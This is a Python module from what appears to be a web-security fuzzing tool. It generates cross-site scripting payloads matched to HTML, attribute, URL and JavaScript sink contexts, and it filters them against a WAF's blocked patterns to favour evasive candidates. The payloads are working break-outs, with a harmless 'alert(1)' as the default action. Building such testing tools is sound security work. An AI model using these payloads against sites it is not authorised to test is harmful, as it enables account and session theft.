"""Context-typed XSS payload generation (Phase 8 T8.2, FR-MUT-2).

The auditor records *where* a reflected marker lands — the sink context
(`oracle/context.py::CONTEXTS`: ``html`` / ``html-attribute`` / ``url-attribute`` /
``js``). A payload only executes if it breaks out of that specific context, so the
generator produces candidates matched to it — and, when told which signatures the
filter blocks, prefers the candidates that avoid them (e.g. drop ``<script>`` and
``onerror=`` when those are filtered, keep ``<svg onfocus=…>``).

Pure Python; deterministic order. The generated payloads are the raw break-outs; the
search loop (T8.4) further mutates them with the operator framework (T8.1).
"""

from __future__ import annotations

import re
from typing import Sequence

from fuzzlab.oracle.context import CONTEXTS  # noqa: F401  (shared vocabulary)

# A diverse set per context, so filter-avoidance still leaves working candidates.
# `{m}` is the JS action (marker/payload) to run.
_TEMPLATES: dict[str, tuple[str, ...]] = {
    "html": (
        "<svg onload={m}>",
        "<img src=x onerror={m}>",
        "<svg onfocus={m} tabindex=1>",
        "<body onpageshow={m}>",
        "<video><source onerror={m}>",
        "<details open ontoggle={m}>",
        "<script>{m}</script>",
    ),
    "html-attribute": (
        '"><svg onload={m}>',
        '" onfocus={m} autofocus="',
        "'><svg onload={m}>",
        "' onfocus={m} autofocus='",
        '"><img src=x onerror={m}>',
    ),
    "url-attribute": (
        "javascript:{m}",
        "jaVaScRipt:{m}",
        "javascript:{m}//",
    ),
    "js": (
        "';{m};//",
        "'-{m}-'",
        "\\';{m};//",
        "</script><svg onload={m}>",
    ),
}

DEFAULT_MARKER = "alert(1)"


def context_from_sink(sink_context: str | None) -> str:
    """Map an auditor sink context to a generation context (``none``/unknown → html)."""
    if sink_context in _TEMPLATES:
        return sink_context
    return "html"


def _blocked(payload: str, blocked: Sequence[str]) -> bool:
    return any(re.search(pat, payload) for pat in blocked)


def xss_payloads(sink_context: str | None, marker: str = DEFAULT_MARKER,
                 blocked: Sequence[str] | None = None) -> list[str]:
    """Context-typed XSS candidates, best first.

    ``blocked`` is a list of regex patterns the filter catches (e.g. the WAF rule
    patterns); candidates matching any are dropped so what remains is filter-aware. If
    every candidate is blocked, returns the full context list unfiltered (so the caller
    can still hand them to the mutation search to try to evade).
    """
    ctx = context_from_sink(sink_context)
    templates = _TEMPLATES[ctx]
    candidates = [t.format(m=marker) for t in templates]
    if not blocked:
        return candidates
    surviving = [c for c in candidates if not _blocked(c, blocked)]
    return surviving or candidates


def all_contexts() -> tuple[str, ...]:
    """The generation contexts (a subset of the oracle's CONTEXTS with templates)."""
    return tuple(_TEMPLATES)
